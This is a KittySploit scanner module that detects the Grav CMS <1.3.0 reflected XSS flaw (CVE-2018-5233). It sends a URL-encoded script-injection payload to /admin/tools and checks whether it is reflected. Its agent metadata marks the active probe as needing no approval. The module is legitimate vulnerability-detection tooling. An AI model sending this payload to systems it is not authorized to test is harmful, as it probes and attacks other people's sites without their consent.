#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Grav CMS before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Grav CMS <1.3.0 - Cross-Site Scripting Detection',
        'description': 'Grav CMS before 1.3.0 is vulnerable to cross-site scripting via system/src/Grav/Common/Twig/Twig.php and allows remote attackers to inject arbitrary web script or HTML via the PATH_INFO to admin/tools.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'xss', 'grav', 'getgrav', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://sysdream.com/news/lab/2018-03-15-cve-2018-5233-grav-cms-admin-plugin-reflected-cross-site-scripting-xss-vulnerability/',
            'http://www.openwall.com/lists/oss-security/2018/03/15/1',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-5233',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-5233',
    }

    def run(self):
        r = self.http_request(method="GET", path='/admin/tools/a--%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>', '/themes/grav', 'Grav Admin Login', 'data-grav-',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Grav CMS <1.3.0 - Cross-Site Scripting detected",
                path='/admin/tools/a--%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

